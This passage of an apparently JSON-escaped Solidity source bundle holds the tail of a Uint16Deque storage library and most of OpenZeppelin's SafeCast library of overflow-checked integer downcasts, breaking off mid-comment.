0 and last item at\\n   * `length(deque) - 1`.\\n   *\\n   * Reverts with `QueueOutOfBounds` if the index is out of bounds.\\n   */\\n  function at(\\n    Uint16Deque storage deque,\\n    uint256 index_\\n  ) internal view returns (uint16 value) {\\n    if (index_ >= length(deque) * 16) revert QueueOutOfBounds();\\n\\n    unchecked {\\n      return\\n        _getEntry(\\n          deque._data[\\n            deque._beginIndex +\\n              uint64(deque._beginSlot + (index_ % 16)) /\\n              16 +\\n              uint64(index_ / 16)\\n          ],\\n          uint64(((deque._beginSlot + index_) % 16))\\n        );\\n    }\\n  }\\n\\n  /**\\n   * @dev Returns the number of items in the queue.\\n   */\\n  function length(Uint16Deque storage deque) internal view returns (uint256) {\\n    unchecked {\\n      return\\n        (16 - deque._beginSlot) +\\n        deque._endSlot +\\n        deque._endIndex *\\n        16 -\\n        deque._beginIndex *\\n        16 -\\n        16;\\n    }\\n  }\\n\\n  /**\\n   * @dev Returns true if the queue is empty.\\n   */\\n  function empty(Uint16Deque storage deque) internal view returns (bool) {\\n    return\\n      deque._endSlot == deque._beginSlot &&\\n      deque._endIndex == deque._beginIndex;\\n  }\\n\\n  function _setData(\\n    uint256 data_,\\n    uint64 slot_,\\n    uint16 value\\n  ) private pure returns (uint256) {\\n    return (data_ & (~_getSlotMask(slot_))) + (uint256(value) << (16 * slot_));\\n  }\\n\\n  function _getEntry(uint256 data, uint64 slot_) private pure returns (uint16) {\\n    return uint16((data & _getSlotMask(slot_)) >> (16 * slot_));\\n  }\\n\\n  function _getSlotMask(uint64 slot_) private pure returns (uint256) {\\n    return SLOT_DATA_MASK << (slot_ * 16);\\n  }\\n}\\n\"\r\n    },\r\n    \"contracts/libraries/SafeCast.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/math/SafeCast.sol)\\n// This file was procedurally generated from scripts/generate/templates/SafeCast.js.\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Wrappers over Solidity's uintXX/intXX casting operators with added overflow\\n * checks.\\n *\\n * Downcasting from uint256/int256 in Solidity does not revert on overflow. This can\\n * easily result in undesired exploitation or bugs, since developers usually\\n * assume that overflows raise errors. `SafeCast` restores this intuition by\\n * reverting the transaction when such an operation overflows.\\n *\\n * Using this library instead of the unchecked operations eliminates an entire\\n * class of bugs, so it's recommended to use it always.\\n *\\n * Can be combined with {SafeMath} and {SignedSafeMath} to extend it to smaller types, by performing\\n * all math on `uint256` and `int256` and then downcasting.\\n */\\nlibrary SafeCast {\\n    /**\\n     * @dev Returns the downcasted uint248 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint248).\\n     *\\n     * Counterpart to Solidity's `uint248` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 248 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint248(uint256 value) internal pure returns (uint248) {\\n        require(\\n            value <= type(uint248).max,\\n            \\\"SafeCast: value doesn't fit in 248 bits\\\"\\n        );\\n        return uint248(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint240 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint240).\\n     *\\n     * Counterpart to Solidity's `uint240` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 240 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint240(uint256 value) internal pure returns (uint240) {\\n        require(\\n            value <= type(uint240).max,\\n            \\\"SafeCast: value doesn't fit in 240 bits\\\"\\n        );\\n        return uint240(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint232 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint232).\\n     *\\n     * Counterpart to Solidity's `uint232` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 232 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint232(uint256 value) internal pure returns (uint232) {\\n        require(\\n            value <= type(uint232).max,\\n            \\\"SafeCast: value doesn't fit in 232 bits\\\"\\n        );\\n        return uint232(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint224 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint224).\\n     *\\n     * Counterpart to Solidity's `uint224` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 224 bits\\n     *\\n     * _Available since v4.2._\\n     */\\n    function toUint224(uint256 value) internal pure returns (uint224) {\\n        require(\\n            value <= type(uint224).max,\\n            \\\"SafeCast: value doesn't fit in 224 bits\\\"\\n        );\\n        return uint224(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint216 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint216).\\n     *\\n     * Counterpart to Solidity's `uint216` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 216 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint216(uint256 value) internal pure returns (uint216) {\\n        require(\\n            value <= type(uint216).max,\\n            \\\"SafeCast: value doesn't fit in 216 bits\\\"\\n        );\\n        return uint216(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint208 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint208).\\n     *\\n     * Counterpart to Solidity's `uint208` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 208 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint208(uint256 value) internal pure returns (uint208) {\\n        require(\\n            value <= type(uint208).max,\\n            \\\"SafeCast: value doesn't fit in 208 bits\\\"\\n        );\\n        return uint208(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint200 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint200).\\n     *\\n     * Counterpart to Solidity's `uint200` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 200 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint200(uint256 value) internal pure returns (uint200) {\\n        require(\\n            value <= type(uint200).max,\\n            \\\"SafeCast: value doesn't fit in 200 bits\\\"\\n        );\\n        return uint200(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint192 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint192).\\n     *\\n     * Counterpart to Solidity's `uint192` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 192 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint192(uint256 value) internal pure returns (uint192) {\\n        require(\\n            value <= type(uint192).max,\\n            \\\"SafeCast: value doesn't fit in 192 bits\\\"\\n        );\\n        return uint192(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint184 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint184).\\n     *\\n     * Counterpart to Solidity's `uint184` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 184 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint184(uint256 value) internal pure returns (uint184) {\\n        require(\\n            value <= type(uint184).max,\\n            \\\"SafeCast: value doesn't fit in 184 bits\\\"\\n        );\\n        return uint184(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint176 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint176).\\n     *\\n     * Counterpart to Solidity's `uint176` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 176 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint176(uint256 value) internal pure returns (uint176) {\\n        require(\\n            value <= type(uint176).max,\\n            \\\"SafeCast: value doesn't fit in 176 bits\\\"\\n        );\\n        return uint176(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint168 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint168).\\n     *\\n     * Counterpart to Solidity's `uint168` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 168 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint168(uint256 value) internal pure returns (uint168) {\\n        require(\\n            value <= type(uint168).max,\\n            \\\"SafeCast: value doesn't fit in 168 bits\\\"\\n        );\\n        return uint168(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint160 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint160).\\n     *\\n     * Counterpart to Solidity's `uint160` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 160 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint160(uint256 value) internal pure returns (uint160) {\\n        require(\\n            value <= type(uint160).max,\\n            \\\"SafeCast: value doesn't fit in 160 bits\\\"\\n        );\\n        return uint160(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint152 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint152).\\n     *\\n     * Counterpart to Solidity's `uint152` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 152 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint152(uint256 value) internal pure returns (uint152) {\\n        require(\\n            value <= type(uint152).max,\\n            \\\"SafeCast: value doesn't fit in 152 bits\\\"\\n        );\\n        return uint152(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint144 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint144).\\n     *\\n     * Counterpart to Solidity's `uint144` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 144 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint144(uint256 value) internal pure returns (uint144) {\\n        require(\\n            value <= type(uint144).max,\\n            \\\"SafeCast: value doesn't fit in 144 bits\\\"\\n        );\\n        return uint144(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint136 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint136).\\n     *\\n     * Counterpart to Solidity's `uint136` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 136 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint136(uint256 value) internal pure returns (uint136) {\\n        require(\\n            value <= type(uint136).max,\\n            \\\"SafeCast: value doesn't fit in 136 bits\\\"\\n        );\\n        return uint136(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint128 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint128).\\n     *\\n     * Counterpart to Solidity's `uint128` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 128 bits\\n     *\\n     * _Available since v2.5._\\n     */\\n    function toUint128(uint256 value) internal pure returns (uint128) {\\n        require(\\n            value <= type(uint128).max,\\n            \\\"SafeCast: value doesn't fit in 128 bits\\\"\\n        );\\n        return uint128(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint120 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint120).\\n     *\\n     * Counterpart to Solidity's `uint120` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 120 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint120(uint256 value) internal pure returns (uint120) {\\n        require(\\n            value <= type(uint120).max,\\n            \\\"SafeCast: value doesn't fit in 120 bits\\\"\\n        );\\n        return uint120(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint112 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint112).\\n     *\\n     * Counterpart to Solidity's `uint112` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 112 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint112(uint256 value) internal pure returns (uint112) {\\n        require(\\n            value <= type(uint112).max,\\n            \\\"SafeCast: value doesn't fit in 112 bits\\\"\\n        );\\n        return uint112(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint104 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint104).\\n     *\\n     * Counterpart to Solidity's `uint104` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 104 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint104(uint256 value) internal pure returns (uint104) {\\n        require(\\n            value <= type(uint104).max,\\n            \\\"SafeCast: value doesn't fit in 104 bits\\\"\\n        );\\n        return uint104(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint96 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint96).\\n     *\\n     * Counterpart to Solidity's `uint96` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 96 bits\\n     *\\n     * _Available since v4.2._\\n     */\\n    function toUint96(uint256 value) internal pure returns (uint96) {\\n        require(\\n            value <= type(uint96).max,\\n            \\\"SafeCast: value doesn't fit in 96 bits\\\"\\n        );\\n        return uint96(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint88 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint88).\\n     *\\n     * Counterpart to Solidity's `uint88` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 88 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint88(uint256 value) internal pure returns (uint88) {\\n        require(\\n            value <= type(uint88).max,\\n            \\\"SafeCast: value doesn't fit in 88 bits\\\"\\n        );\\n        return uint88(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint80 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint80).\\n     *\\n     * Counterpart to Solidity's `uint80` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 80 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint80(uint256 value) internal pure returns (uint80) {\\n        require(\\n            value <= type(uint80).max,\\n            \\\"SafeCast: value doesn't fit in 80 bits\\\"\\n        );\\n        return uint80(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint72 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint72).\\n     *\\n     * Counterpart to Solidity's `uint72` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 72 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint72(uint256 value) internal pure returns (uint72) {\\n        require(\\n            value <= type(uint72).max,\\n            \\\"SafeCast: value doesn't fit in 72 bits\\\"\\n        );\\n        return uint72(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint64 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint64).\\n     *\\n     * Counterpart to Solidity's `uint64` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 64 bits\\n     *\\n     * _Available since v2.5._\\n     */\\n    function toUint64(uint256 value) internal pure returns (uint64) {\\n        require(\\n            value <= type(uint64).max,\\n            \\\"SafeCast: value doesn't fit in 64 bits\\\"\\n        );\\n        return uint64(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint56 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint56).\\n     *\\n     * Counterpart to Solidity's `uint56` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 56 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint56(uint256 value) internal pure returns (uint56) {\\n        require(\\n            value <= type(uint56).max,\\n            \\\"SafeCast: value doesn't fit in 56 bits\\\"\\n        );\\n        return uint56(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint48 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint48).\\n     *\\n     * Counterpart to Solidity's `uint48` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 48 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint48(uint256 value) internal pure returns (uint48) {\\n        require(\\n            value <= type(uint48).max,\\n            \\\"SafeCast: value doesn't fit in 48 bits\\\"\\n        );\\n        return uint48(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint40 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint40).\\n     *\\n     * Counterpart to Solidity's `uint40` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 40 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint40(uint256 value) internal pure returns (uint40) {\\n        require(\\n            value <= type(uint40).max,\\n            \\\"SafeCast: value doesn't fit in 40 bits\\\"\\n        );\\n        return uint40(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint32 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint32).\\n     *\\n     * Counterpart to Solidity's `uint32` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 32 bits\\n     *\\n     * _Available since v2.5._\\n     */\\n    function toUint32(uint256 value) internal pure returns (uint32) {\\n        require(\\n            value <= type(uint32).max,\\n            \\\"SafeCast: value doesn't fit in 32 bits\\\"\\n        );\\n        return uint32(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint24 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint24).\\n     *\\n     * Counterpart to Solidity's `uint24` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 24 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toUint24(uint256 value) internal pure returns (uint24) {\\n        require(\\n            value <= type(uint24).max,\\n            \\\"SafeCast: value doesn't fit in 24 bits\\\"\\n        );\\n        return uint24(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint16 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint16).\\n     *\\n     * Counterpart to Solidity's `uint16` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 16 bits\\n     *\\n     * _Available since v2.5._\\n     */\\n    function toUint16(uint256 value) internal pure returns (uint16) {\\n        require(\\n            value <= type(uint16).max,\\n            \\\"SafeCast: value doesn't fit in 16 bits\\\"\\n        );\\n        return uint16(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint8 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint8).\\n     *\\n     * Counterpart to Solidity's `uint8` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 8 bits\\n     *\\n     * _Available since v2.5._\\n     */\\n    function toUint8(uint256 value) internal pure returns (uint8) {\\n        require(\\n            value <= type(uint8).max,\\n            \\\"SafeCast: value doesn't fit in 8 bits\\\"\\n        );\\n        return uint8(value);\\n    }\\n\\n    /**\\n     * @dev Converts a signed int256 into an unsigned uint256.\\n     *\\n     * Requirements:\\n     *\\n     * - input must be greater than or equal to 0.\\n     *\\n     * _Available since v3.0._\\n     */\\n    function toUint256(int256 value) internal pure returns (uint256) {\\n        require(value >= 0, \\\"SafeCast: value must be positive\\\");\\n        return uint256(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int248 from int256, reverting on\\n     * overflow (when the input is less than smallest int248 or\\n     * greater than largest int248).\\n     *\\n     * Counterpart to Solidity's `int248` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 248 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt248(int256 value) internal pure returns (int248 downcasted) {\\n        downcasted = int248(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 248 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int240 from int256, reverting on\\n     * overflow (when the input is less than smallest int240 or\\n     * greater than largest int240).\\n     *\\n     * Counterpart to Solidity's `int240` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 240 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt240(int256 value) internal pure returns (int240 downcasted) {\\n        downcasted = int240(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 240 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int232 from int256, reverting on\\n     * overflow (when the input is less than smallest int232 or\\n     * greater than largest int232).\\n     *\\n     * Counterpart to Solidity's `int232` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 232 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt232(int256 value) internal pure returns (int232 downcasted) {\\n        downcasted = int232(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 232 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int224 from int256, reverting on\\n     * overflow (when the input is less than smallest int224 or\\n     * greater than largest int224).\\n     *\\n     * Counterpart to Solidity's `int224` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 224 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt224(int256 value) internal pure returns (int224 downcasted) {\\n        downcasted = int224(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 224 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int216 from int256, reverting on\\n     * overflow (when the input is less than smallest int216 or\\n     * greater than largest int216).\\n     *\\n     * Counterpart to Solidity's `int216` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 216 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt216(int256 value) internal pure returns (int216 downcasted) {\\n        downcasted = int216(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 216 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int208 from int256, reverting on\\n     * overflow (when the input is less than smallest int208 or\\n     * greater than largest int208).\\n     *\\n     * Counterpart to Solidity's `int208` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 208 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt208(int256 value) internal pure returns (int208 downcasted) {\\n        downcasted = int208(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 208 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int200 from int256, reverting on\\n     * overflow (when the input is less than smallest int200 or\\n     * greater than largest int200).\\n     *\\n     * Counterpart to Solidity's `int200` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 200 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt200(int256 value) internal pure returns (int200 downcasted) {\\n        downcasted = int200(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 200 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int192 from int256, reverting on\\n     * overflow (when the input is less than smallest int192 or\\n     * greater than largest int192).\\n     *\\n     * Counterpart to Solidity's `int192` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 192 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt192(int256 value) internal pure returns (int192 downcasted) {\\n        downcasted = int192(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 192 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int184 from int256, reverting on\\n     * overflow (when the input is less than smallest int184 or\\n     * greater than largest int184).\\n     *\\n     * Counterpart to Solidity's `int184` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 184 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt184(int256 value) internal pure returns (int184 downcasted) {\\n        downcasted = int184(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 184 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int176 from int256, reverting on\\n     * overflow (when the input is less than smallest int176 or\\n     * greater than largest int176).\\n     *\\n     * Counterpart to Solidity's `int176` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 176 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt176(int256 value) internal pure returns (int176 downcasted) {\\n        downcasted = int176(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 176 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int168 from int256, reverting on\\n     * overflow (when the input is less than smallest int168 or\\n     * greater than largest int168).\\n     *\\n     * Counterpart to Solidity's `int168` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 168 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt168(int256 value) internal pure returns (int168 downcasted) {\\n        downcasted = int168(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 168 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int160 from int256, reverting on\\n     * overflow (when the input is less than smallest int160 or\\n     * greater than largest int160).\\n     *\\n     * Counterpart to Solidity's `int160` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 160 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt160(int256 value) internal pure returns (int160 downcasted) {\\n        downcasted = int160(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 160 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int152 from int256, reverting on\\n     * overflow (when the input is less than smallest int152 or\\n     * greater than largest int152).\\n     *\\n     * Counterpart to Solidity's `int152` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 152 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt152(int256 value) internal pure returns (int152 downcasted) {\\n        downcasted = int152(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 152 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int144 from int256, reverting on\\n     * overflow (when the input is less than smallest int144 or\\n     * greater than largest int144).\\n     *\\n     * Counterpart to Solidity's `int144` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 144 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt144(int256 value) internal pure returns (int144 downcasted) {\\n        downcasted = int144(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 144 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int136 from int256, reverting on\\n     * overflow (when the input is less than smallest int136 or\\n     * greater than largest int136).\\n     *\\n     * Counterpart to Solidity's `int136` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 136 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt136(int256 value) internal pure returns (int136 downcasted) {\\n        downcasted = int136(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 136 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int128 from int256, reverting on\\n     * overflow (when the input is less than smallest int128 or\\n     * greater than largest int128).\\n     *\\n     * Counterpart to Solidity's `int128` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 128 bits\\n     *\\n     * _Available since v3.1._\\n     */\\n    function toInt128(int256 value) internal pure returns (int128 downcasted) {\\n        downcasted = int128(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 128 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int120 from int256, reverting on\\n     * overflow (when the input is less than smallest int120 or\\n     * greater than largest int120).\\n     *\\n     * Counterpart to Solidity's `int120` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 120 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt120(int256 value) internal pure returns (int120 downcasted) {\\n        downcasted = int120(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 120 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int112 from int256, reverting on\\n     * overflow (when the input is less than smallest int112 or\\n     * greater than largest int112).\\n     *\\n     * Counterpart to Solidity's `int112` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 112 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt112(int256 value) internal pure returns (int112 downcasted) {\\n        downcasted = int112(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 112 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int104 from int256, reverting on\\n     * overflow (when the input is less than smallest int104 or\\n     * greater than largest int104).\\n     *\\n     * Counterpart to Solidity's `int104` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 104 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt104(int256 value) internal pure returns (int104 downcasted) {\\n        downcasted = int104(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 104 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int96 from int256, reverting on\\n     * overflow (when the input is less than smallest int96 or\\n     * greater than largest int96).\\n     *\\n     * Counterpart to Solidity's `int96` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 96 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt96(int256 value) internal pure returns (int96 downcasted) {\\n        downcasted = int96(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 96 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int88 from int256, reverting on\\n     * overflow (when the input is less than smallest int88 or\\n     * greater than largest int88).\\n     *\\n     * Counterpart to Solidity's `int88` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 88 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt88(int256 value) internal pure returns (int88 downcasted) {\\n        downcasted = int88(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 88 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int80 from int256, reverting on\\n     * overflow (when the input is less than smallest int80 or\\n     * greater than largest int80).\\n     *\\n     * Counterpart to Solidity's `int80` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 80 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt80(int256 value) internal pure returns (int80 downcasted) {\\n        downcasted = int80(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 80 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int72 from int256, reverting on\\n     * overflow (when the input is less than smallest int72 or\\n     * greater than largest int72).\\n     *\\n     * Counterpart to Solidity's `int72` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 72 bits\\n     *\\n     * _Available since v4.7._\\n     */\\n    function toInt72(int256 value) internal pure returns (int72 downcasted) {\\n        downcasted = int72(value);\\n        require(downcasted == value, \\\"SafeCast: value doesn't fit in 72 bits\\\");\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int64 from int256, reverting on\\n     * overflow (when the input is less than smallest int64 or\\n     * greater than 